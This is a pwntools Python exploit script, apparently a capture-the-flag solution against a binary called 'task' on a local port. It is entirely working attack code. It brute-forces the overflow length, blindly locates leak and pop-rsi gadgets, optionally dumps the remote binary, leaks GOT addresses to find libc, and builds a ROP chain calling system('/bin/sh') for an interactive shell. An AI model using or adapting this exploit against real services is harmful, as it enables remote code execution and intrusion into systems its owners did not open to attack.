#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host==127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './task'

context.log_level = 'error'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

base = 0x400000

def find_buflen():
    for i in range(0, 512, 8):
        io = start()
        try:
            io.sendline(b'A'*i)
            io.readline()
            io.readline()
        except:
            print(f'[+] Buffer length found: {i}')
            return i
        io.close()


def find_leak(length):
    for i in range(base+0x1000, base+0x2000, 1):
        sleep(0.01)
        io = start()
#        print(f'[+] {hex(i)}')
        try:
            p = b''
            p += b'A'*(length - 1)
            p += b'\x00'
            p += p64(i)
            io.sendline(p)
            io.sendline('asd') # in case if read called
            io.readline()
            a = io.read()
#            print(a)
            if b'Hello AAAA' in a:
                print(f'[+] MEM leak {hex(i)}: {a}')
                io.close()
                return i
        except Exception as err:
            io.close()
        io.close()

def find_poprsi(length, leak):
    for i in range(base+0x1000, base+0x2000, 1):
        sleep(0.01)
        io = start()
#        print(f'[+] {hex(i)}')
        try:
            p = b''
            p += b'A'*(length - 1) 
            p += b'\x00'
            p += p64(i)
            p += p64(base + 1)
            p += b'JUNKJUNK'
            p += p64(i+3)
            p += p64(leak)
#            print(len(p))
            io.sendline(p)
            io.send(b'asd\n') # in case if read called
            io.readline()
            a = io.read()
            if b'ELF' in a:
                print(f'[+] MEM leak {hex(i)}: {a}')
                io.close()
                return i
        except Exception as e:
#            print(repr(e))
            io.close()
        io.close()

def dump(length, leak, poprsi):
    l = 0
    while True:
        f = open('dump', 'ab')
        if '0a' in hex(base + l):
            f.write(b'\x00')
            f.flush()
            f.close()
            l += 1
            continue
        sleep(0.01)
        io = start()
        p = b''
        p += b'A'*(length - 1) 
        p += b'\x00'
        p += p64(poprsi)
        p += p64(base + l)
        p += b'JUNKJUNK'
        p += p64(poprsi + 3)
        p += p64(leak)
        io.sendline(p)
        try:
            io.readline()
            io.recvuntil(b'Hello ')
        except:
            io.close()
            f.flush()
            f.close()
            continue
        a = io.read()
        f.write(a[:-2] + b'\x00')
        f.flush()
        f.close()
        io.close()
        print(f'[+] {hex(base + l)}:{a[:-2]}')
        l += len(a) - 1
        if l >= 0x5000:
            break


length = find_buflen()
leak = find_leak(length)
#sleep(2)
poprsi = find_poprsi(length, leak)
#sleep(2)
#dump(length, leak, poprsi)

puts = 0x401040
printf_got = 0x404028
puts_got = 0x404018
func = 0x4011c9
poprdi = 0x4012fb

#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc.so.6')
io = start()

p = b''
p += b'A'*(length - 1)
p += b'\x00'
p += p64(poprdi)
p += p64(printf_got)
p += p64(poprsi + 3)
p += p64(puts)
p += p64(poprdi)
p += p64(puts_got)
p += p64(poprsi + 3)
p += p64(puts)
p += p64(poprsi + 3)
p += p64(func)

io.sendline(p)
io.readline()
a = u64(io.read(7)[:-1].ljust(8, b'\x00'))
b = u64(io.read(7)[:-1].ljust(8, b'\x00'))
print(f'[+] printf: {hex(a)}')
print(f'[+] puts: {hex(b)}')
libc_base = b - libc.symbols['puts']
print(f'[+] libc base: {hex(libc_base)}')

p = b''
p += b'A'*(length-1)
p += b'\x00'
p += p64(poprdi)
p += p64(next(libc.search(b'/bin/sh\0')) + libc_base)
p += p64(poprsi+3)
p += p64(libc.symbols['system'] + libc_base)

io.sendline(p)

io.interactive()

